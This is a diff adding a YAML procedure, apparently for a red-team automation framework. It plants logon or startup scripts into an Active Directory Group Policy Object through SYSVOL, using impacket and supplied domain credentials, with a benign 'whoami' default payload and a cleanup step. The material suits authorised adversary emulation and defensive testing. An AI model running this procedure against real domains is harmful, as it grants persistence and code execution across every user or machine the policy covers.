@@ -1,0 +1,76 @@
+---
+api_version: 2.0
+uuid: b5e3c2d7-6f1a-4e8b-9c0d-2a7f5e4b3c1a
+name: Add GPO Logon Script
+authors:
+  - isaac_fletcher
+description: |
+  Abuses write access to a Group Policy Object (GPO) to add a logon or startup script.
+  Scripts are uploaded to SYSVOL and registered in scripts.ini (batch/cmd/vbs) or
+  psscripts.ini (PowerShell). They execute when users log on or computers start.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0003 Persistence
+    - TA0004 Privilege Escalation
+  techniques:
+    - T1037 Boot or Logon Initialization Scripts
+  subtechniques:
+    - T1037.003 Network Logon Script
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: gpo_id
+    description: The GPO GUID to modify (e.g., 12345677-ABCD-9876-ABCD-123456789012)
+  - name: filename
+    description: Filename to create on target (.bat/.cmd/.vbs for batch, .ps1 for PowerShell)
+    default: "logon.bat"
+  - name: content
+    description: Script content to execute
+    default: "whoami > C:\\Windows\\Temp\\logon_output.txt"
+  - name: event
+    description: Script event (Logon/Logoff for users, Startup/Shutdown for machines)
+    choices:
+      - Logon
+      - Logoff
+      - Startup
+      - Shutdown
+    default: "Logon"
+steps:
+  - name: setup_deps
+    description: Install impacket and ldap3
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket ldap3"
+
+  - name: add_logon_script
+    description: Add a logon/startup script to the target GPO
+    inline: |
+      python3 gpo_logon_script.py \
+        '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}' \
+        -dc-ip '{{.Args.dc}}' \
+        -gpo-id '{{.Args.gpo_id}}' \
+        -filename '{{.Args.filename}}' \
+        -content '{{.Args.content}}' \
+        -event '{{.Args.event}}' \
+        -v
+    cleanup:
+      inline: |
+        python3 gpo_logon_script.py \
+          '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}' \
+          -dc-ip '{{.Args.dc}}' \
+          -gpo-id '{{.Args.gpo_id}}' \
+          -filename '{{.Args.filename}}' \
+          -event '{{.Args.event}}' \
+          --cleanup -v || true
